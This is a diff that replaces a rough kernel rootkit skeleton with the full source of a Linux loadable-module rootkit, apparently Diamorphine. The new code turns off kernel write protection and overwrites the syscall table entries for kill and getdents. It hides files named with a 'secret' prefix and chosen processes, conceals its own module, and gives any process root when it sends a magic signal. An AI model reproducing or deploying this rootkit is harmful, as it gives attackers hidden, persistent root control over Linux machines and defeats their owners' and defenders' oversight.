@@ -1,189 +1,294 @@
-#include <linux/init.h>     //used for things like __init and __exit
-#include <linux/module.h>   //load the module into kernel
-#include <linux/kernel.h>    //kernel functions
-#include <linux/kallsyms.h>     //capture this so I know where to grab addresses from
-#include <linux/kprobes.h>      //needed for kallsyms_lookup on linux kernel 5.7+
-#include <linux/unistd.h>       //defines syscall numbers
-#include <linux/version.h>      // Linux kernel versions
-#include <asm/paravirt.h>       //needed to read the cr0 register
-#include <linux/dirent.h>       //contains ptregs structs and directory syscall
+#include <linux/sched.h>
+#include <linux/module.h>
+#include <linux/syscalls.h>
+#include <linux/dirent.h>
+#include <linux/slab.h>
+#include <linux/version.h> 
+#include <linux/proc_ns.h>
+#include <linux/fdtable.h>
+#include <linux/kprobes.h>
 
-//for use with later if rootkit is modified to work with <5.7 kern linux
-#define PTREGS_SYSCALL_STUB 1
+#define MAGIC_PREFIX "secret"
+#define PF_INVISIBLE 0x10000000
+#define __NR_getdents 141
 
-/*
-syscalls start with asmlinkage
-function pointer
-*/
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
-
-/* 
-ptregs is a structure given back to us with the syscall_64 table
-it contains all registers put on the stack.
-idk what ptregs stands for
-making global
-*/
-static ptregs_t ORIG_KILL;
-
-//making global SYS_CALL_TABLE variable because I'm messing up passing it around.
-unsigned long* SYS_CALL_TABLE;
-
-enum signals {
-    SIGSUPER = 64,  //become root
-    SIGINVIS = 63   //hide
+struct linux_dirent {
+        unsigned long   d_ino;
+        unsigned long   d_off;
+        unsigned short  d_reclen;
+        char            d_name[1];
 };
 
-//modifying kprobe. filling out name here
+enum {
+	SIGINVIS = 31,
+	SIGMODINVIS = 63,
+	SIGSUPER = 64,
+};
+
 static struct kprobe kp = {
-    .symbol_name = "kallsyms_lookup_name"
+	    .symbol_name = "kallsyms_lookup_name"
 };
 
-//store original SYS_CALL_TABLE so I dont mess it up
-static int store(void)
+unsigned long cr0;
+static unsigned long *__sys_call_table;
+typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
+static t_syscall orig_getdents;
+static t_syscall orig_getdents64;
+static t_syscall orig_kill;
+
+
+unsigned long *get_syscall_table_bf(void)
 {
-    //keeping original value
-    ORIG_KILL = (ptregs_t)SYS_CALL_TABLE[__NR_kill];
-    printk(KERN_INFO "ORIG_KILL table entry successfully stored\n");
-    return 0;
+	unsigned long *syscall_table;
+	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+	kallsyms_lookup_name_t kallsyms_lookup_name;
+	register_kprobe(&kp);
+	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+	unregister_kprobe(&kp);
+	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+	return syscall_table;
 }
 
-static int cleanup(void)
+struct task_struct *find_task(pid_t pid)
 {
-    //putting back original value from store function
-    SYS_CALL_TABLE[__NR_kill] = (unsigned long)ORIG_KILL;
-    printk(KERN_INFO "Syscalltable reverted back to original value\n");
-    return 0;
+	struct task_struct *p = current;
+	for_each_process(p) {
+		if (p->pid == pid)
+			return p;
+	}
+	return NULL;
 }
 
-static asmlinkage long hacked_kill(const struct pt_regs *regs)
+int is_invisible(pid_t pid)
 {
-    //grab register for syscall from https://syscalls64.paolostivanin.com
-    //this is pulling the sig out from the kill command
-    int sig = regs->si;
-    
-    //created enum to elevate privs
-    if(sig == SIGSUPER)
-    {
-        printk(KERN_INFO "Signal: %d == SIGSUPER: %d, going to become root\n", sig, SIGSUPER);
-        return 0;
-    }
-    else if (sig == SIGINVIS)
-    {
-        printk(KERN_INFO "Signal: %d == SIGINVIS: %d, going to hide itself\n", sig, SIGINVIS);
-        return 0;
-    }
-    return ORIG_KILL(regs);
+	struct task_struct *task;
+	if (!pid)
+		return 0;
+	task = find_task(pid);
+	if (!task)
+		return 0;
+	if (task->flags & PF_INVISIBLE)
+		return 1;
+	return 0;
 }
 
-static int hook(void)
-{
-    //holding a pointer to the hacked_kill function address
-    //gotta typecast as SYS_CALL_TABLE is holding unsigned longs
-    SYS_CALL_TABLE[__NR_kill] = (unsigned long)&hacked_kill;
-    return 0;
+static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
+	int ret = orig_getdents64(pt_regs), err;
+	unsigned short proc = 0;
+	unsigned long off = 0;
+	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+	struct inode *d_inode;
+	int fd = (int) pt_regs->di;
+	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+
+	if (ret <= 0)
+		return ret;
+
+	kdirent = kzalloc(ret, GFP_KERNEL);
+	if (kdirent == NULL)
+		return ret;
+
+	err = copy_from_user(kdirent, dirent, ret);
+	if (err)
+		goto out;
+
+	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+		/*&& MINOR(d_inode->i_rdev) == 1*/)
+		proc = 1;
+
+	while (off < ret) {
+		dir = (void *)kdirent + off;
+		if ((!proc &&
+		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
+		|| (proc &&
+		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+			if (dir == kdirent) {
+				ret -= dir->d_reclen;
+				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				continue;
+			}
+			prev->d_reclen += dir->d_reclen;
+		} else
+			prev = dir;
+		off += dir->d_reclen;
+	}
+	err = copy_to_user(dirent, kdirent, ret);
+	if (err)
+		goto out;
+out:
+	kfree(kdirent);
+	return ret;
 }
 
+static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
+	int ret = orig_getdents(pt_regs), err;
+	unsigned short proc = 0;
+	unsigned long off = 0;
+	struct linux_dirent *dir, *kdirent, *prev = NULL;
+	struct inode *d_inode;
 
-/*
-CR0 is x86 control register. Now write protection to stop rootkits from using write_cr0.
-But we can make our own version to still be able to do it.
-Going to create three functions to manipulate cr0
-*/
-static inline void write_cr0_force(unsigned long val)
-{
-    unsigned long __force_order;
+	int fd = (int) pt_regs->di;
+	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
 
-    //some asm to perform what the older, unprotected write cr0 would do
-    asm volatile(
-        "mov %0, %%cr0"
-        : "+r"(val), "+m"(__force_order));    
-}
-// below should disable the write protection
-static void unprotect_memory(void)
-{
-    // sets bits from 0x10000 to 0x01111
-    write_cr0_force(read_cr0() & (~ 0x10000));
-    printk(KERN_INFO "memory is unprotected\n");
-}
-// below should enable write protection
-static void protect_memory(void)
-{
-    write_cr0_force(read_cr0() | (0x10000));
-    printk(KERN_INFO "memory is protected\n");
-}
+	if (ret <= 0)
+		return ret;	
 
-//when the rootkit gets closed
-static void __exit mod_exit(void)
-{
-    //print to dmesg
-    printk(KERN_INFO "rootkit exited\n");
+	kdirent = kzalloc(ret, GFP_KERNEL);
+	if (kdirent == NULL)
+		return ret;
 
-    unprotect_memory();
+	err = copy_from_user(kdirent, dirent, ret);
+	if (err)
+		goto out;
 
-    //revert back the syscalltable
-    cleanup();
+	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 
-    protect_memory();
-    
-    return;
-}
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+		/*&& MINOR(d_inode->i_rdev) == 1*/)
+		proc = 1;
 
-//mod_init aka main that's user level so kernel level so mod_init
-static int __init mod_init(void)
-{
-    //print to dmesg
-    printk(KERN_INFO "rootkit initialized\n");
-
-    //kprobe needed to access table as table is no longer exported in newer linux
-    printk(KERN_INFO "registering kprobe..\n");
-    if (register_kprobe(&kp) < 0)
-    {
-        printk("Could not register kprobe\n");
-        return 1;
-    }
-    printk(KERN_INFO "register kprobe success\n");
-
-    //create types to handle data
-    typedef unsigned long(*kallsyms_lookup_name_t)(const char *name);
-    kallsyms_lookup_name_t kallsyms_lookup_name;
-    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-
-    //close out kprobe now that i'm done with it    
-    unregister_kprobe(&kp);
-
-    SYS_CALL_TABLE = (unsigned long*) kallsyms_lookup_name("SYS_CALL_TABLE");
-    if(!SYS_CALL_TABLE)
-    {
-        printk(KERN_INFO "Sys call table not found.. exiting");
-        return 1;
-    }
-    printk(KERN_INFO "sys call table found\n");
-
-    if(store() != 0)
-    {
-        printk(KERN_INFO "error happened in store()\n");
-        return 1;
-    }
-
-    unprotect_memory();
-
-    if(hook() != 0)
-    {
-        printk(KERN_INFO "error happened in hook()\n");
-    }
-
-    protect_memory();
-
-    return 0;
+	while (off < ret) {
+		dir = (void *)kdirent + off;
+		if ((!proc && 
+		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
+		|| (proc &&
+		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+			if (dir == kdirent) {
+				ret -= dir->d_reclen;
+				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				continue;
+			}
+			prev->d_reclen += dir->d_reclen;
+		} else
+			prev = dir;
+		off += dir->d_reclen;
+	}
+	err = copy_to_user(dirent, kdirent, ret);
+	if (err)
+		goto out;
+out:
+	kfree(kdirent);
+	return ret;
 }
 
-//tell it where to go insmod
-module_init(mod_init);
+void give_root(void)
+{
+		struct cred *newcreds;
+		newcreds = prepare_creds();
+		if (newcreds == NULL)
+			return;
+			newcreds->uid.val = newcreds->gid.val = 0;
+			newcreds->euid.val = newcreds->egid.val = 0;
+			newcreds->suid.val = newcreds->sgid.val = 0;
+			newcreds->fsuid.val = newcreds->fsgid.val = 0;
+		commit_creds(newcreds);
+}
 
-//tell it where to go on rmmod
-module_exit(mod_exit);
+static inline void tidy(void)
+{
+	kfree(THIS_MODULE->sect_attrs);
+	THIS_MODULE->sect_attrs = NULL;
+}
 
-//needed for module build. removed taint dmesg message
-MODULE_LICENSE("GPL");  //required by gcc to build
+static struct list_head *module_previous;
+static short module_hidden = 0;
+void module_show(void)
+{
+	list_add(&THIS_MODULE->list, module_previous);
+	module_hidden = 0;
+}
+
+void module_hide(void)
+{
+	module_previous = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	module_hidden = 1;
+}
+
+asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
+{
+	pid_t pid = (pid_t) pt_regs->di;
+	int sig = (int) pt_regs->si;
+	struct task_struct *task;
+	switch (sig) {
+		case SIGINVIS:
+			if ((task = find_task(pid)) == NULL)
+				return -ESRCH;
+			task->flags ^= PF_INVISIBLE;
+			break;
+		case SIGSUPER:
+			give_root();
+			break;
+		case SIGMODINVIS:
+			if (module_hidden) module_show();
+			else module_hide();
+			break;
+		default:
+			return orig_kill(pt_regs);
+	}
+	return 0;
+}
+
+static inline void write_cr0_forced(unsigned long val)
+{
+	unsigned long __force_order;
+
+	asm volatile(
+		"mov %0, %%cr0"
+		: "+r"(val), "+m"(__force_order));
+}
+
+static inline void protect_memory(void)
+{
+	write_cr0_forced(cr0);
+
+}
+
+static inline void unprotect_memory(void)
+{
+	write_cr0_forced(cr0 & ~0x00010000);
+}
+
+static int __init diamorphine_init(void)
+{
+	__sys_call_table = get_syscall_table_bf();
+	if (!__sys_call_table)
+		return -1;
+	cr0 = read_cr0();
+	module_hide();
+	tidy();
+
+	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
+	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
+	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
+
+	unprotect_memory();
+
+	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
+	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
+	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+
+	protect_memory();
+
+	return 0;
+}
+
+static void __exit
+diamorphine_cleanup(void)
+{
+	unprotect_memory();
+
+	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
+	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
+	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+
+	protect_memory();
+}
+
+module_init(diamorphine_init);
+module_exit(diamorphine_cleanup);
+
+MODULE_LICENSE("Dual BSD/GPL");
+MODULE_AUTHOR("m0nad");
 MODULE_DESCRIPTION("LKM rootkit");
-MODULE_VERSION("0.0.1");
